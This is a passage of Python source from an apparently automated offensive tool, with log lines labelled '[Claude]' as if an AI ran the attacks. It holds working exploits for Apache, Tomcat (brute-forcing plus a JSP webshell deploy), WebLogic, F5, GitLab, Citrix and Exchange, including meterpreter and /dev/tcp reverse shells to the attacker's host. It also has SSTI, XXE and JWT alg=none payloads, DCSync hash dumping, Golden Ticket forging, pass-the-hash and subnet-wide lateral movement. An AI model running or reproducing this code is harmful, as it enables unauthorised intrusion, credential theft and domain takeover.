                }], target)

        self._log(f"[Claude] OSINT: reconocimiento completo finalizado → {target}")

    # ─────────────────────────────────────────────────────────────────────────
    # Category B: Enterprise exploits
    # ─────────────────────────────────────────────────────────────────────────
    def _enterprise_exploits(self, target, open_ports, accumulated_output):
        """Apache 2.4.49 RCE, Tomcat WAR, WebLogic, F5 BIG-IP, GitLab, Citrix, Exchange."""
        port_set = {p["port"]: p for p in open_ports}
        http_ports = [p for p in open_ports if "http" in p["service"].lower() or p["port"] in (80,443,8080,8443,8888,7001,4848,9090,7443)]

        for p in http_ports[:5]:
            port_num = p["port"]
            proto = "https" if port_num in (443,8443,7443) else "http"
            base = f"{proto}://{target}:{port_num}"
            ver = p.get("version","").lower()
            svc = p.get("service","").lower()

            # ── Apache 2.4.49/50 path traversal + RCE (CVE-2021-41773/42013) ──
            if "apache" in ver or "httpd" in ver or "apache" in svc:
                self._log(f"[Claude] ENTERPRISE: Apache path traversal CVE-2021-41773 @ {base}")
                apache_out, _ = self._run_cmd(
                    f"apache-41773-{port_num}",
                    f"# CVE-2021-41773: path traversal\n"
                    f"curl -s --max-time 10 '{base}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd' 2>/dev/null | head -5; "
                    f"curl -s --max-time 10 '{base}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd' 2>/dev/null | head -5; "
                    f"# CVE-2021-41773 RCE via mod_cgi\n"
                    f"curl -s --max-time 10 '{base}/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh' "
                    f"-d 'echo Content-Type: text/plain; echo; id; hostname' 2>/dev/null | head -3; "
                    f"# CVE-2021-42013 (2.4.50)\n"
                    f"curl -s --max-time 10 '{base}/cgi-bin/%%2e%%2e/%%2e%%2e/%%2e%%2e/%%2e%%2e/etc/passwd' 2>/dev/null | head -5",
                    target, timeout=25,
                )
                if "root:" in apache_out or "uid=" in apache_out:
                    self._capture_evidence(apache_out, target, f"apache-rce-{port_num}", "CVE-2021-41773/42013")
                    accumulated_output.append(f"=== Apache Path Traversal RCE ===\n{apache_out[:500]}")
                    self._save_findings([{
                        "title": f"Apache 2.4.49/50 Path Traversal + RCE CVE-2021-41773 @ {base}",
                        "severity": "critical",
                        "description": f"Path traversal + RCE sin autenticación via mod_cgi.\n{apache_out[:200]}",
                        "cve": "CVE-2021-41773",
                    }], target)

            # ── Tomcat Manager → WAR deploy → shell ──────────────────────
            if "tomcat" in ver or port_num in (8080,8443,8005,8009):
                self._log(f"[Claude] ENTERPRISE: Tomcat Manager brute → WAR deploy @ {base}")
                tc_creds = [("tomcat","tomcat"),("admin","admin"),("manager","manager"),("tomcat","s3cret"),("admin","password"),("admin","s3cret")]
                for tc_u, tc_p in tc_creds:
                    tc_check, _ = self._run_cmd(
                        f"tomcat-mgr-{tc_u}",
                        f"curl -s --max-time 8 -u '{tc_u}:{tc_p}' "
                        f"-o /dev/null -w '%{{http_code}}' '{base}/manager/html' 2>/dev/null",
                        target, timeout=10,
                    )
                    if tc_check.strip() == "200":
                        self._log(f"[Claude] ENTERPRISE: Tomcat Manager accesible {tc_u}:{tc_p} → desplegando WAR!")
                        # Create minimal WAR with JSP webshell
                        war_out, _ = self._run_cmd(
                            f"tomcat-war-deploy-{tc_u}",
                            f"# Create JSP webshell WAR\n"
                            f"WARDIR=$(mktemp -d); mkdir -p $WARDIR/WEB-INF; "
                            f"echo '<%@ page import=\"java.io.*\" %><% Process p=Runtime.getRuntime().exec(request.getParameter(\"cmd\")); "
                            f"BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream())); "
                            f"String line; while((line=br.readLine())!=null){{out.println(line);}} %>' > $WARDIR/shell.jsp; "
                            f"echo '<web-app/>' > $WARDIR/WEB-INF/web.xml; "
                            f"cd $WARDIR && jar cvf /tmp/pwn_{target.replace('.','_')}.war . 2>/dev/null; "
                            f"# Deploy WAR\n"
                            f"curl -s --max-time 20 -u '{tc_u}:{tc_p}' "
                            f"-T /tmp/pwn_{target.replace('.','_')}.war "
                            f"'{base}/manager/text/deploy?path=/pwn&update=true' 2>/dev/null; "
                            f"# Test execution\n"
                            f"sleep 3; curl -s --max-time 10 '{base}/pwn/shell.jsp?cmd=id' 2>/dev/null | head -3",
                            target, timeout=40,
                        )
                        self._capture_evidence(war_out, target, f"tomcat-war-{tc_u}", "Tomcat WAR RCE")
                        accumulated_output.append(f"=== Tomcat WAR Deploy RCE ({tc_u}:{tc_p}) ===\n{war_out[:500]}")
                        self._save_findings([{
                            "title": f"Tomcat Manager Credenciales Débiles + RCE via WAR @ {base}",
                            "severity": "critical",
                            "description": f"Tomcat Manager accesible con {tc_u}:{tc_p} → WAR webshell desplegado → RCE.",
                            "cve": "",
                        }], target)
                        break

            # ── WebLogic deserialization (CVE-2019-2725 + CVE-2020-14882) ─
            if port_num in (7001,7002,4848,9200) or "weblogic" in ver or "oracle" in svc:
                self._log(f"[Claude] ENTERPRISE: WebLogic RCE check @ {base}")
                wl_out, _ = self._run_cmd(
                    f"weblogic-rce-{port_num}",
                    f"# CVE-2020-14882 — admin console bypass\n"
                    f"curl -s --max-time 10 '{base}/console/images/%252E%252E%252Fconsole.portal' "
                    f"2>/dev/null | grep -iE 'weblogic|console|domain' | head -3; "
                    f"# CVE-2020-14883 — admin console RCE\n"
                    f"curl -s --max-time 10 -X POST "
                    f"'{base}/console/css/%252E%252E%252Fconsole.portal' "
                    f"-d '_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec(new+String[]{{\\\"id\\\",\\\">/tmp/wl_proof.txt\\\"}});\")' "
                    f"2>/dev/null | head -3; "
                    f"# CVE-2019-2725 — deserialization\n"
                    f"msfconsole -q -x 'use exploit/multi/misc/weblogic_deserialize_asyncresponseservice; "
                    f"set RHOSTS {target}; set RPORT {port_num}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set payload java/meterpreter/reverse_tcp; run; sleep 12; exit' 2>/dev/null | head -15",
                    target, timeout=60,
                )
                if any(k in wl_out.lower() for k in ["weblogic", "session", "uid=", "meterpreter"]):
                    self._capture_evidence(wl_out, target, f"weblogic-rce-{port_num}", "WebLogic RCE")
                    accumulated_output.append(f"=== WebLogic RCE ===\n{wl_out[:500]}")
                    self._save_findings([{
                        "title": f"WebLogic RCE CVE-2019-2725/CVE-2020-14882 @ {base}",
                        "severity": "critical",
                        "description": f"WebLogic Server vulnerable a deserialization/console bypass → RCE.",
                        "cve": "CVE-2020-14882",
                    }], target)

            # ── F5 BIG-IP CVE-2022-1388 ───────────────────────────────────
            if port_num in (443,8443,8080) or "f5" in ver or "big-ip" in ver:
                f5_out, _ = self._run_cmd(
                    f"f5-bigip-{port_num}",
                    f"curl -sk --max-time 10 "
                    f"-H 'Connection: X-F5-Auth-Token, X-Forwarded-Host' "
                    f"-H 'X-F5-Auth-Token: a' "
                    f"-H 'X-Forwarded-Host: localhost' "
                    f"'{base}/mgmt/tm/util/bash' "
                    f"-d '{{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}}' 2>/dev/null | head -5; "
                    f"# Also try CVE-2020-5902\n"
                    f"curl -sk --max-time 10 "
                    f"'{base}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd' "
                    f"2>/dev/null | grep 'root:' | head -3",
                    target, timeout=20,
                )
                if "uid=" in f5_out or "root:" in f5_out or '"commandResult"' in f5_out:
                    self._capture_evidence(f5_out, target, f"f5-bigip-rce-{port_num}", "CVE-2022-1388 F5 BIG-IP")
                    accumulated_output.append(f"=== F5 BIG-IP RCE ===\n{f5_out[:400]}")
                    self._save_findings([{
                        "title": f"F5 BIG-IP iControl REST CVE-2022-1388 RCE @ {base}",
                        "severity": "critical",
                        "description": f"F5 BIG-IP iControl REST API accesible sin autenticación → RCE.\n{f5_out[:200]}",
                        "cve": "CVE-2022-1388",
                    }], target)

            # ── GitLab CE/EE RCE CVE-2021-22205 ─────────────────────────
            gl_check, _ = self._run_cmd(
                f"gitlab-detect-{port_num}",
                f"curl -s --max-time 8 -I '{base}/' 2>/dev/null | grep -i 'x-gitlab\\|gitlab' | head -3; "
                f"curl -s --max-time 8 '{base}/users/sign_in' 2>/dev/null | grep -i 'gitlab' | head -2",
                target, timeout=12,
            )
            if "gitlab" in gl_check.lower():
                self._log(f"[Claude] ENTERPRISE: GitLab detectado → CVE-2021-22205")
                gl_rce, _ = self._run_cmd(
                    f"gitlab-rce-{port_num}",
                    f"# CVE-2021-22205: ExifTool image parsing RCE\n"
                    f"python3 - << 'GLEOF'\n"
                    f"import requests, tempfile, os\n"
                    f"base='{base}'\n"
                    f"# Create malicious DjVu file with code injection\n"
                    f"payload = b'AT&TFORM\\x00\\x00\\x00 DJVUINFO\\x00\\x00\\x00\\x0a\\x00\\x58\\x00\\x58\\x18\\x00\\x2c\\x01\\xff\\xff\\xf9\\xae'\n"
                    f"# Try anonymous upload (CVE-2021-22205 affects unauthenticated users)\n"
                    f"r=requests.post(f'{{base}}/users/sign_in',data={{'user[login]':'root','user[password]':'5iveL!fe','authenticity_token':''}},timeout=8,verify=False)\n"
                    f"if r.status_code==200 and 'Dashboard' in r.text: print('GITLAB_DEFAULT_CREDS_root:5iveL!fe')\n"
                    f"GLEOF\n"
                    f"2>/dev/null; "
                    f"msfconsole -q -x 'use exploit/multi/http/gitlab_exif_rce; "
                    f"set RHOSTS {target}; set RPORT {port_num}; "
                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set SRVHOST {self.lhost}; "
                    f"set payload linux/x64/meterpreter/reverse_tcp; run; sleep 15; exit' 2>/dev/null | head -15",
                    target, timeout=60,
                )
                self._capture_evidence(gl_rce, target, f"gitlab-rce-{port_num}", "CVE-2021-22205 GitLab")
                if any(k in gl_rce.lower() for k in ["session", "uid=", "meterpreter", "GITLAB_DEFAULT"]):
                    accumulated_output.append(f"=== GitLab RCE ===\n{gl_rce[:500]}")
                    self._save_findings([{
                        "title": f"GitLab RCE CVE-2021-22205 / Credenciales por Defecto @ {base}",
                        "severity": "critical",
                        "description": f"GitLab vulnerable → RCE sin autenticación.\n{gl_rce[:200]}",
                        "cve": "CVE-2021-22205",
                    }], target)

            # ── Citrix NetScaler CVE-2019-19781 ──────────────────────────
            if port_num in (443,80,8443) or "citrix" in ver or "netscaler" in ver:
                citrix_out, _ = self._run_cmd(
                    f"citrix-19781-{port_num}",
                    f"curl -sk --max-time 10 '{base}/vpn/../vpns/cfg/smb.conf' 2>/dev/null | head -5; "
                    f"curl -sk --max-time 10 '{base}/vpn/../vpns/portal/scripts/newbm.pl' "
                    f"-d 'title=test&url=http://x&desc=x;id>/tmp/citrix_proof.txt;' 2>/dev/null | head -3; "
                    f"curl -sk --max-time 10 '{base}/vpn/../vpns/portal/scripts/newbm.pl' "
                    f"-d 'title=x&url=x&desc=x;bash+-i+>&/dev/tcp/{self.lhost}/{self.lport}+0>&1' "
                    f"2>/dev/null | head -3",
                    target, timeout=25,
                )
                if "smb.conf" in citrix_out.lower() or "workgroup" in citrix_out.lower():
                    self._capture_evidence(citrix_out, target, f"citrix-rce-{port_num}", "CVE-2019-19781 Citrix")
                    accumulated_output.append(f"=== Citrix NetScaler RCE ===\n{citrix_out[:400]}")
                    self._save_findings([{
                        "title": f"Citrix NetScaler CVE-2019-19781 Path Traversal + RCE @ {base}",
                        "severity": "critical",
                        "description": f"Citrix ADC/Gateway vulnerable → path traversal + RCE.\n{citrix_out[:200]}",
                        "cve": "CVE-2019-19781",
                    }], target)

            # ── Exchange ProxyLogon/ProxyShell ────────────────────────────
            exchange_check, _ = self._run_cmd(
                f"exchange-detect-{port_num}",
                f"curl -sk --max-time 8 -I '{base}/owa/' 2>/dev/null | "
                f"grep -i 'x-ms-diagnostics\\|x-owa\\|exchange\\|microsoft' | head -3",
                target, timeout=10,
            )
            if any(k in exchange_check.lower() for k in ["x-ms", "owa", "exchange", "microsoft"]):
                self._log(f"[Claude] ENTERPRISE: Exchange detectado → ProxyLogon/ProxyShell")
                exch_out, _ = self._run_cmd(
                    f"exchange-proxy-{port_num}",
                    f"# ProxyLogon CVE-2021-26855 SSRF check\n"
                    f"curl -sk --max-time 10 "
                    f"'{base}/owa/auth/x.js' "
                    f"-H 'Cookie: X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;' "
                    f"2>/dev/null | head -5; "
                    f"# ProxyShell CVE-2021-34473\n"
                    f"curl -sk --max-time 10 "
                    f"'{base}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com' "
                    f"2>/dev/null | head -5; "
                    f"msfconsole -q -x 'use exploit/windows/http/exchange_proxylogon_rce; "
                    f"set RHOSTS {target}; set RPORT {port_num}; set SSL true; "
                    f"set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set payload windows/x64/meterpreter/reverse_tcp; run; sleep 20; exit' 2>/dev/null | head -15",
                    target, timeout=60,
                )
                self._capture_evidence(exch_out, target, f"exchange-rce-{port_num}", "ProxyLogon/ProxyShell")
                if any(k in exch_out.lower() for k in ["session", "meterpreter", "nt authority", "\"value\""]):
                    accumulated_output.append(f"=== Exchange ProxyLogon/ProxyShell ===\n{exch_out[:500]}")
                    self._save_findings([{
                        "title": f"Exchange Server ProxyLogon/ProxyShell RCE @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"Exchange vulnerable a ProxyLogon (CVE-2021-26855) → RCE.",
                        "cve": "CVE-2021-26855",
                    }], target)

    # ─────────────────────────────────────────────────────────────────────────
    # Category A: Advanced web vulnerability scanning
    # ─────────────────────────────────────────────────────────────────────────
    def _advanced_web_scan(self, target, open_ports, accumulated_output):
        """SSTI, XXE, JWT attacks, Java deserialization, GraphQL, CORS, .env/.git."""
        http_ports = [p for p in open_ports if "http" in p["service"].lower()
                      or p["port"] in (80,443,8080,8443,8888)]
        if not http_ports:
            return

        for p in http_ports[:3]:
            port_num = p["port"]
            proto = "https" if port_num in (443,8443) else "http"
            base = f"{proto}://{target}:{port_num}"

            # ── SSTI detection (Jinja2/Twig/Freemarker/Mako) ────────────
            ssti_out, _ = self._run_cmd(
                f"ssti-{port_num}",
                f"# SSTI probe: mathematical expression that renders\n"
                f"for param in name search q id page message template; do "
                f"  for payload in '{{{{7*7}}}}' '{{{{7*\"7\"}}}}' '${{7*7}}' '#{{{{{{'7*7'}}}}}}' "
                f"  '<%= 7*7 %>' '{{7*7}}' '@(7*7)' '%24%7B7*7%7D'; do "
                f"    R=$(curl -s --max-time 8 '{base}/?'$param'='$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$payload'))\") "
                f"    2>/dev/null | grep -oE '49|4949' | head -1); "
                f"    [ \"$R\" = '49' ] && echo \"SSTI_CONFIRMED: param=$param payload=$payload\" && break 2; "
                f"  done; "
                f"done",
                target, timeout=60,
            )
            if "SSTI_CONFIRMED" in ssti_out:
                m = re.search(r'SSTI_CONFIRMED: param=(\S+) payload=(\S+)', ssti_out)
                ssti_param = m.group(1) if m else "unknown"
                self._capture_evidence(ssti_out, target, f"ssti-{port_num}", "SSTI")
                accumulated_output.append(f"=== SSTI @ {base} ===\n{ssti_out[:400]}")
                # Try RCE
                ssti_rce, _ = self._run_cmd(
                    f"ssti-rce-{port_num}",
                    f"# Jinja2 RCE payload\n"
                    f"PAYLOAD=$(python3 -c \"import urllib.parse; "
                    f"print(urllib.parse.quote(\\\"{{{{config.__class__.__init__.__globals__['os'].popen('id').read()}}}}\\\"))\" 2>/dev/null); "
                    f"curl -s --max-time 10 '{base}/?{ssti_param}='$PAYLOAD 2>/dev/null | grep 'uid=' | head -2; "
                    f"# Twig RCE\n"
                    f"PAYLOAD2=$(python3 -c \"import urllib.parse; print(urllib.parse.quote(\\\"{{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}\\\"))\" 2>/dev/null); "
                    f"curl -s --max-time 10 '{base}/?{ssti_param}='$PAYLOAD2 2>/dev/null | grep 'uid=' | head -2",
                    target, timeout=20,
                )
                if "uid=" in ssti_rce:
                    self._capture_evidence(ssti_rce, target, f"ssti-rce-{port_num}", "SSTI RCE")
                self._save_findings([{
                    "title": f"Server-Side Template Injection (SSTI) → RCE @ {base}",
                    "severity": "critical",
                    "description": f"Parámetro '{ssti_param}' vulnerable a SSTI. Payload 7*7=49 confirmado.\n{ssti_rce[:200] if 'uid=' in ssti_rce else ssti_out[:200]}",
                    "cve": "",
                }], target)

            # ── XXE injection ─────────────────────────────────────────────
            xxe_out, _ = self._run_cmd(
                f"xxe-{port_num}",
                f"# Find XML endpoints\n"
                f"for path in / /api /soap /xml /ws /api/v1 /service /upload /xmlrpc; do "
                f"  R=$(curl -s --max-time 8 -X POST '{base}$path' "
                f"  -H 'Content-Type: application/xml' "
                f"  -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root><data>&xxe;</data></root>' "
                f"  2>/dev/null | grep 'root:' | head -1); "
                f"  [ -n \"$R\" ] && echo \"XXE_CONFIRMED: $path — root: $R\" && break; "
                f"  R2=$(curl -s --max-time 8 -X POST '{base}$path' "
                f"  -H 'Content-Type: text/xml; charset=utf-8' "
                f"  -H 'SOAPAction: \"\"' "
                f"  -d '<?xml version=\"1.0\"?><!DOCTYPE s [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><data>&xxe;</data></s:Body></s:Envelope>' "
                f"  2>/dev/null | grep 'root:' | head -1); "
                f"  [ -n \"$R2\" ] && echo \"XXE_SOAP_CONFIRMED: $path — $R2\" && break; "
                f"done",
                target, timeout=60,
            )
            if "XXE_CONFIRMED" in xxe_out or "XXE_SOAP_CONFIRMED" in xxe_out:
                self._capture_evidence(xxe_out, target, f"xxe-{port_num}", "XXE injection")
                accumulated_output.append(f"=== XXE @ {base} ===\n{xxe_out[:400]}")
                self._save_findings([{
                    "title": f"XXE Injection → File Read @ {base}",
                    "severity": "critical",
                    "description": f"XML External Entity injection permite leer archivos del servidor.\n{xxe_out[:200]}",
                    "cve": "",
                }], target)

            # ── JWT attacks ───────────────────────────────────────────────
            jwt_out, _ = self._run_cmd(
                f"jwt-attack-{port_num}",
                f"# Find JWT in responses\n"
                f"JWT=$(curl -s --max-time 10 '{base}/' 2>/dev/null | "
                f"grep -oP 'eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+' | head -1); "
                f"[ -z \"$JWT\" ] && JWT=$(curl -s --max-time 10 -c /tmp/jwt_cookie_{target.replace('.','_')}.txt '{base}/login' "
                f"-X POST -d 'username=admin&password=admin' 2>/dev/null | "
                f"grep -oP 'eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+' | head -1); "
                f"[ -z \"$JWT\" ] && JWT=$(cat /tmp/jwt_cookie_{target.replace('.','_')}.txt 2>/dev/null | "
                f"grep -oP 'eyJ[a-zA-Z0-9_-]+\\.eyJ[a-zA-Z0-9_-]+\\.[a-zA-Z0-9_-]+' | head -1); "
                f"if [ -n \"$JWT\" ]; then "
                f"  echo \"JWT_FOUND: $JWT\"; "
                f"  # Test alg=none\n"
                f"  python3 -c \""
                f"import base64, json\n"
                f"parts='$JWT'.split('.')\n"
                f"if len(parts)==3:\n"
                f"  h=json.loads(base64.urlsafe_b64decode(parts[0]+'=='))\n"
                f"  p=json.loads(base64.urlsafe_b64decode(parts[1]+'=='))\n"
                f"  print(f'Header: {{h}}')\n"
                f"  print(f'Payload: {{p}}')\n"
                f"  h['alg']='none'\n"
                f"  # Escalate: change role to admin\n"
                f"  for k in ['role','admin','is_admin','isAdmin','user_type']:\n"
                f"    if k in p: p[k]='admin' if p[k]!='admin' else p[k]\n"
                f"  p['is_admin']=True; p.setdefault('role','admin')\n"
                f"  new_h=base64.urlsafe_b64encode(json.dumps(h).encode()).rstrip(b'=').decode()\n"
                f"  new_p=base64.urlsafe_b64encode(json.dumps(p).encode()).rstrip(b'=').decode()\n"
                f"  new_jwt=f'{{new_h}}.{{new_p}}.'\n"
                f"  print(f'JWT_NONE_ALG: {{new_jwt}}')\n"
                f"\" 2>/dev/null; "
                f"fi",
                target, timeout=25,
            )
            if "JWT_FOUND" in jwt_out:
                # Test the none-alg JWT
                none_jwt = re.search(r'JWT_NONE_ALG: (\S+)', jwt_out)
                if none_jwt:
                    test_out, _ = self._run_cmd(
                        f"jwt-none-test-{port_num}",
                        f"curl -s --max-time 10 '{base}/api/admin' "
                        f"-H 'Authorization: Bearer {none_jwt.group(1)}' 2>/dev/null | head -5; "
                        f"curl -s --max-time 10 '{base}/api/users' "
                        f"-H 'Authorization: Bearer {none_jwt.group(1)}' 2>/dev/null | head -5",
                        target, timeout=15,
                    )
                    if test_out.strip() and "unauthorized" not in test_out.lower():
                        self._capture_evidence(test_out, target, f"jwt-none-{port_num}", "JWT alg=none")
                        self._save_findings([{
                            "title": f"JWT Algorithm Confusion (alg=none) @ {base}",
                            "severity": "critical",
                            "description": f"JWT acepta alg=none → escalada de privilegios sin firmar.\n{test_out[:200]}",
                            "cve": "",
                        }], target)
                accumulated_output.append(f"=== JWT @ {base} ===\n{jwt_out[:400]}")

            # ── GraphQL introspection + injection ────────────────────────
            gql_out, _ = self._run_cmd(
                f"graphql-{port_num}",
                f"for path in /graphql /api/graphql /graphiql /gql /query /v1/graphql; do "
                f"  R=$(curl -s --max-time 8 -X POST '{base}$path' "
                f"  -H 'Content-Type: application/json' "
                f"  -d '{{\"query\":\"{{__schema{{queryType{{name}}}}}}\"}}' "
                f"  2>/dev/null | grep -i 'queryType\\|__schema\\|__typename' | head -2); "
                f"  [ -n \"$R\" ] && echo \"GRAPHQL_FOUND: $path\" && "
                f"  curl -s --max-time 10 -X POST '{base}$path' "
                f"  -H 'Content-Type: application/json' "
                f"  -d '{{\"query\":\"{{__schema{{types{{name,fields{{name,type{{name}}}}}}}}}}\"}}' "
                f"  2>/dev/null | python3 -c \"import json,sys;d=json.load(sys.stdin);"
                f"  [print(t['name'],':',[f['name'] for f in (t.get('fields') or [])]) "
                f"  for t in d.get('data',{{}}).get('__schema',{{}}).get('types',[]) "
                f"  if not t['name'].startswith('__')][:15]\" 2>/dev/null | head -20 && break; "
                f"done",
                target, timeout=40,
            )
            if "GRAPHQL_FOUND" in gql_out:
                self._capture_evidence(gql_out, target, f"graphql-{port_num}", "GraphQL introspection")
                accumulated_output.append(f"=== GraphQL {base} ===\n{gql_out[:600]}")
                self._save_findings([{
                    "title": f"GraphQL Introspection Habilitada — Schema Expuesto @ {base}",
                    "severity": "medium",
                    "description": f"GraphQL endpoint con introspección activa → schema completo expuesto.\n{gql_out[:300]}",
                    "cve": "",
                }], target)

            # ── CORS misconfiguration ─────────────────────────────────────
            cors_out, _ = self._run_cmd(
                f"cors-{port_num}",
                f"# Test wildcard + null origin\n"
                f"curl -s --max-time 8 -H 'Origin: https://evil.com' -I '{base}/api/' 2>/dev/null | "
                f"grep -i 'access-control' | head -3; "
                f"curl -s --max-time 8 -H 'Origin: null' -I '{base}/api/' 2>/dev/null | "
                f"grep -i 'access-control' | head -3; "
                f"# Check reflection of Origin\n"
                f"curl -s --max-time 8 -H 'Origin: https://attacker.com' -I '{base}/' 2>/dev/null | "
                f"grep -i 'access-control-allow-origin: https://attacker' | head -2",
                target, timeout=20,
            )
            if re.search(r'Access-Control-Allow-Origin:\s*(\*|null|https?://attacker)', cors_out, re.I):
                self._save_findings([{
                    "title": f"CORS Misconfiguration — Origen Arbitrario Aceptado @ {base}",
                    "severity": "medium",
                    "description": f"CORS permite orígenes no autorizados → posible robo de datos autenticados.\n{cors_out[:200]}",
                    "cve": "",
                }], target)
                accumulated_output.append(f"=== CORS Misconfiguration {base} ===\n{cors_out[:300]}")

            # ── .env + .git + backup file exposure ───────────────────────
            exposed_out, _ = self._run_cmd(
                f"exposed-files-{port_num}",
                f"for path in /.env /.env.local /.env.prod /.env.backup "
                f"/.git/HEAD /.git/config /backup.zip /backup.tar.gz "
                f"/db.sql /database.sql /dump.sql "
                f"/config.php /config.php.bak /wp-config.php.bak "
                f"/phpinfo.php /info.php /test.php /server-status /server-info; do "
                f"  CODE=$(curl -s -o /dev/null -w '%{{http_code}}' --max-time 5 '{base}$path' 2>/dev/null); "
                f"  [ \"$CODE\" = '200' ] && echo \"EXPOSED: {base}$path ($CODE)\" && "
                f"  curl -s --max-time 8 '{base}$path' 2>/dev/null | head -5; "
                f"done",
                target, timeout=60,
            )
            exposed = re.findall(r'EXPOSED: (https?://[^\s(]+)', exposed_out)
            for exp_url in exposed[:5]:
                sev = "critical" if any(k in exp_url for k in [".env", ".git", ".sql", "wp-config"]) else "medium"
                self._save_findings([{
                    "title": f"Archivo Sensible Expuesto: {exp_url.split('/')[-1]} @ {base}",
                    "severity": sev,
                    "description": f"Archivo accesible públicamente: {exp_url}\n{exposed_out[:300]}",
                    "cve": "",
                }], target)
            if exposed:
                accumulated_output.append(f"=== Exposed Files {base} ===\n{exposed_out[:600]}")

    # ─────────────────────────────────────────────────────────────────────────
    # Category C: Advanced post-exploitation (DCSync, Golden Ticket, pivot, persistence)
    # ─────────────────────────────────────────────────────────────────────────
    def _dcsync_golden_ticket(self, target, user, pwd, accumulated_output):
        """DCSync all domain hashes → craft Golden Ticket if krbtgt found."""
        self._log(f"[Claude] DCSYNC: extrayendo todos los hashes del dominio @ {target}")
        t_safe = target.replace(".", "_")

        # DCSync via impacket-secretsdump
        dc_out, _ = self._run_cmd(
            "dcsync-all",
            f"impacket-secretsdump -just-dc {'-u '+user+' -p '+pwd if user and pwd else '-no-pass'} "
            f"{target} 2>/dev/null | head -80",
            target, timeout=90,
        )
        if dc_out.strip():
            accumulated_output.append(f"=== DCSync {target} ===\n{dc_out[:1200]}")
            self._auto_crack_hashes(dc_out, target, accumulated_output)

            # Extract krbtgt hash for Golden Ticket
            krbtgt_match = re.search(r'krbtgt:[^:]+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::', dc_out)
            domain_sid_match = re.search(r'S-1-5-21-\d+-\d+-\d+', dc_out)

            if krbtgt_match and domain_sid_match:
                krbtgt_nt = krbtgt_match.group(2)
                domain_sid = domain_sid_match.group(0)
                self._log(f"[Claude] GOLDEN-TICKET: krbtgt hash encontrado → forjando ticket!")
                gt_out, _ = self._run_cmd(
                    "golden-ticket",
                    f"impacket-ticketer -nthash {krbtgt_nt} -domain-sid {domain_sid} "
                    f"-domain {target} -user administrator 2>/dev/null | head -20; "
                    f"# Use the ticket\n"
                    f"KRB5CCNAME=/tmp/administrator.ccache impacket-psexec "
                    f"-k -no-pass administrator@{target} "
                    f"'whoami /all && ipconfig /all && dir C:\\Users\\Administrator\\Desktop' "
                    f"2>/dev/null | head -20",
                    target, timeout=60,
                )
                self._capture_evidence(gt_out, target, "golden-ticket", "Golden Ticket krbtgt")
                accumulated_output.append(f"=== Golden Ticket ===\n{gt_out[:600]}")
                self._save_findings([{
                    "title": f"Golden Ticket Forjado — Acceso Permanente al Dominio @ {target}",
                    "severity": "critical",
                    "description": f"Hash krbtgt extraído via DCSync → Golden Ticket → Domain Admin permanente.\n"
                                   f"krbtgt NTLM: {krbtgt_nt[:16]}...\nDomain SID: {domain_sid}",
                    "cve": "",
                }], target)

            # Enumerate all domain admin accounts
            da_accounts = re.findall(r'(Administrator|Domain Admin[^:]*|DA [^:]*):.*:([a-fA-F0-9]{32}):([a-fA-F0-9]{32})', dc_out)
            for da_name, lm, nt in da_accounts[:3]:
                self._log(f"[Claude] DCSYNC: Domain Admin hash → PTH {da_name}")
                pth_out, _ = self._run_cmd(
                    f"dcsync-pth-{da_name[:10]}",
                    f"impacket-psexec -hashes ':{nt}' {da_name}@{target} "
                    f"'whoami && dir C:\\Users\\Administrator\\Desktop\\root.txt 2>nul' 2>/dev/null | head -10",
                    target, timeout=30,
                )
                self._capture_evidence(pth_out, target, f"dcsync-pth-{da_name[:10]}", f"DCSync PTH {da_name}")

            self._save_findings([{
                "title": f"DCSync — Todos los Hashes del Dominio Extraídos @ {target}",
                "severity": "critical",
                "description": f"DCSync exitoso: {len(re.findall(chr(58)+chr(58)+chr(58), dc_out))} hashes extraídos.\n{dc_out[:400]}",
                "cve": "CVE-2015-0008",
            }], target)

    def _lateral_movement_windows(self, target, open_ports, creds_and_hashes, accumulated_output):
        """DCOM/WMI/SMBExec lateral movement to all discovered Windows hosts."""
        if not creds_and_hashes:
            return
        # Discover internal Windows hosts
        self._log(f"[Claude] LATERAL-MOVE: descubriendo hosts Windows internos")
        disco_out, _ = self._run_cmd(
            "win-host-discovery",
            f"crackmapexec smb {target}/24 --no-bruteforce 2>/dev/null | "
            f"grep -E '\\[\\*\\]|Windows|SMB' | head -20",
            target, timeout=60,
        )
        hosts_found = re.findall(r'(\d+\.\d+\.\d+\.\d+)', disco_out)
        hosts_found = [h for h in hosts_found if h != target][:8]

        for h in hosts_found:
            for cred in creds_and_hashes[:3]:
                if ":" not in cred:
                    continue
                u, p = cred.split(":", 1)
                is_hash = bool(re.match(r'^[a-fA-F0-9]{32}$', p))
                self._log(f"[Claude] LATERAL-MOVE: {u} → {h} ({'hash' if is_hash else 'password'})")
                if is_hash:
                    lm_cmd = f"crackmapexec smb {h} -u '{u}' -H '{p}' -x 'whoami /groups' 2>/dev/null | head -10"
                else:
                    lm_cmd = f"crackmapexec smb {h} -u '{u}' -p '{p}' -x 'whoami /groups' 2>/dev/null | head -10"
